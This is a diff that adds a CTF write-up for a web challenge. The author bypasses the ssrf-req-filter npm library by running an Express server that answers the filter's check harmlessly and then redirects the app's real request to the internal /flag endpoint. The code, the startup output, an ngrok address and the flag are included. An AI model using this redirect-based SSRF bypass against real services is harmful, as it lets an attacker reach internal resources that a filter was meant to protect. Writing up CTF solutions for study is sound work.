@@ -110,15 +110,74 @@ app.listen(port, () => {
 
 This is a very direct challenge. We have to bypass the SSRF filter, using the /diff route to get the content of /flag.
 
-Of course, it filters it:
+Of course, we are blocked:
 
+![Request Denied](https://i.imgur.com/O8hqC6g.png)
 
+The validifyURL function calls the ssrfFilter functions, which identifies the hack.
+
+To bypass the filter, I tried and failed some alternatives:
+* Using some SSRF cheat sheets
+* Created a server that redirected the request to 127.0.0.1
+
+The source code for ssrf-req-filter is quite small:
+https://github.com/y-mehta/ssrf-req-filter/blob/master/lib/index.js
+
+The redirect didn't work, because the filter not only analyze the URL string, but it makes the request, following redirects, and checks the IP of the final URL (Damn you!)
+
+Now we know we'll receive two requests: the filter and the actual request from diff function.
+
+To bypass the filter, we can make a server to respond the first request (filter) with a bullshit value and the next (actual request) with a redirect to http://127.0.0.1:1337/flag.
+
+```javascript=
+const express = require('express');
+const app = express();
+const port = 1338;
+
+myredirect = false;
+
+app.get('/one', (req, res) => {
+    if (myredirect) {
+        myredirect = false;
+        res.redirect("http://127.0.0.1:1337/flag");
+    } else {
+        myredirect = true;
+        res.send("One!");
+    }
+});
+
+// Just to fill the second diff textbox
+app.get('/two', (req, res) => {
+    res.send("Two!");
+});
+
+app.listen(port, () => {
+	console.log(`App listening at http://localhost:${port}`)
+});
+```
+
+Let's start it:
+```
+$ node exploiter.js 
+App listening at http://localhost:1338
+```
+
+And expose it on ngrok, with address: http://4070-201-17-126-102.ngrok.io
+
+Let's play the game:
+![Fill the hack values](https://i.imgur.com/jZtHb1b.png)
+
+Post it!
+![diff-owned](https://i.imgur.com/oKRwq9L.png)
+
+Flag:
+```
+idek{d1ff3r3nc3_ch3ck3r_d3ce1v3d_bY_d1ff3r3nc3s}
+```
 
 ## Steghide as a Service
 
 ## Fancy Notes
-
-## TODO: REPO
 
 ## References
 * CTF Time Event: https://ctftime.org/event/1512
